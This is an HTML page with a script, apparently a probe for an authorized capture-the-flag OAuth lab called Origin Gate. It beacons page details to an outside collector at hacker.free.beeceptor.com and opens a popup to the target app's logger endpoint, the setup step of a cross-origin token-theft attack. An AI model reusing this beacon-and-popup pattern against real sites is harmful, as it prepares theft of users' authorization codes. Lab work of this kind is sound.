<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Origin Gate lab connectivity probe</title>
<p id="status">Loading probe…</p>
<script>
/*
 * Benign connectivity probe for the authorized Origin Gate lab.
 * This records page-load and popup availability only; it does not read,
 * transmit, or store OAuth codes, tokens, cookies, or logger contents.
 */
const APP = 'https://solo-leveling-3-0858adee1fc9.pwnbox-lab.com';
const IDP = 'https://google-0858adee1fc9.pwnbox-lab.com';
const COLLECTOR = 'https://hacker.free.beeceptor.com';

document.getElementById('status').textContent =
  'Probe loaded. App: ' + new URL(APP).host + ' | IdP: ' + new URL(IDP).host;

function report(event, detail) {
  const url = COLLECTOR + '/origin-gate-probe?event=' +
    encodeURIComponent(event) + '&detail=' + encodeURIComponent(detail || '');
  fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' }).catch(() => {});
}

report('loaded', location.host + location.pathname);

// Test only whether the lab endpoint can be opened; do not message or read it.
let loggerWindow = null;
try {
  loggerWindow = window.open(APP + '/logger', 'originGateLoggerProbe');
} catch (_) {}
report('logger_window', loggerWindow ? 'opened' : 'blocked');
</script>
